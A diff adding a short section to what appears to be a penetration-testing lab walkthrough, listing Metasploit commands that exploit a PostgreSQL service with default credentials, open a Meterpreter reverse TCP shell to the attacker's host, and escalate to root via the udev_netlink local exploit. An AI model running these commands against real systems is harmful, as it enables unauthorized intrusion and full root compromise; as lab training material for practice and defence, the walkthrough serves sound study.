@@ -124,6 +124,36 @@ We should now have credentials for users on the remote machine. We can verify ou
 
 ```ssh username@<TargetIP>```
 
+Extra: Meterpreter
+
+Postgress exploit
+
+```use exploit/linux/postgres/postgres_payload```
+
+```show options```
+
+```set payload linux/x86/meterpreter/reverse_tcp```
+
+```set LHOST <Local IP>```
+
+```set PASSWORD postgres```
+
+```exploit```
+
+We have a meterpreter as the postgres user. But we can elevate our priviledge to root
+
+```meterpreter> background``` Note the session ID
+
+```use exploit/linux/local/udev_netlink```
+
+```show options```
+
+```set SESSION <ID of meterpreter>```
+
+```exploit```
+
+We now have root privildege with Meterpreter.
+
 ### Sources
 
 #### Downloads
